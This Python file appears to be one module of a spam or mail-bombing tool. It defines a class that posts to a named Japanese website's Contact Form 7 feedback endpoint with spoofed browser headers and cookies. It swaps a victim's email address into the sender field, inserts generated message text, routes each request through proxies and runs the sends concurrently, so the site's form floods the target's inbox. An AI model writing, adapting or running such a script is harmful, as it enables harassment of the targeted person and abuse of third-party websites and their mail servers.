from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            '_ga': 'GA1.2.2044704649.1676889960',
            '_gid': 'GA1.2.1192912473.1676889960',
            '_gat': '1',
            '__gads': 'ID=42eb20f1ec834413-22470878a8dc0045:T=1676889968:RT=1676889968:S=ALNI_MawdNphmlMQR4o_urwr-4kDGpGP1w',
            '__gpi': 'UID=00000bb946ebc659:T=1676889968:RT=1676889968:S=ALNI_MarlG4WCTvBN9RxB0UL_U9UofpyVQ',
        }

        headers = {
            'authority': 'kogaotatsujin.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryeO944eVZYOwppZo6',
            # 'cookie': '_ga=GA1.2.2044704649.1676889960; _gid=GA1.2.1192912473.1676889960; _gat=1; __gads=ID=42eb20f1ec834413-22470878a8dc0045:T=1676889968:RT=1676889968:S=ALNI_MawdNphmlMQR4o_urwr-4kDGpGP1w; __gpi=UID=00000bb946ebc659:T=1676889968:RT=1676889968:S=ALNI_MarlG4WCTvBN9RxB0UL_U9UofpyVQ',
            'origin': 'https://kogaotatsujin.com',
            'referer': 'https://kogaotatsujin.com/contact/',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = '------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n104\r\n------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.0.5\r\n------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nja\r\n------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f104-p102-o1\r\n------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n102\r\n------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="your-name"\r\n\r\nname\r\n------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="your-email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="your-subject"\r\n\r\ntest\r\n------WebKitFormBoundaryeO944eVZYOwppZo6\r\nContent-Disposition: form-data; name="your-message"\r\n\r\ntest\r\n------WebKitFormBoundaryeO944eVZYOwppZo6--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()

        response = requests.post(
            'https://kogaotatsujin.com/wp-json/contact-form-7/v1/contact-forms/104/feedback',
            cookies=cookies,
            headers=headers,
            data=data, proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'mail_sent')
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
